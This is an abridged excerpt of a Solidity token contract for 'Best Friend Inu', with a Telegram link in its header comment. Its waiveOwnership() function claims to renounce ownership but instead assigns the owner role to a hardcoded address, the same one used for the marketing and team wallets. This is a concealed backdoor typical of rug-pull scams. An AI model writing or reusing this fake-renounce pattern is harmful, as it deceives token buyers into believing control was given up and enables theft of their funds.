...
/**
Telegram : https://t.me/+xCNNKHRvZL5mM2M8
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB2568b082Ddb41b192b1d4F305c7188B6Dc2E53b);
    }
...
contract BestFriendInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Best Friend Inu";
    string private _symbol = "B.F.Inu";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB2568b082Ddb41b192b1d4F305c7188B6Dc2E53b);
    address payable private teamWalletAddress = payable(0xB2568b082Ddb41b192b1d4F305c7188B6Dc2E53b);
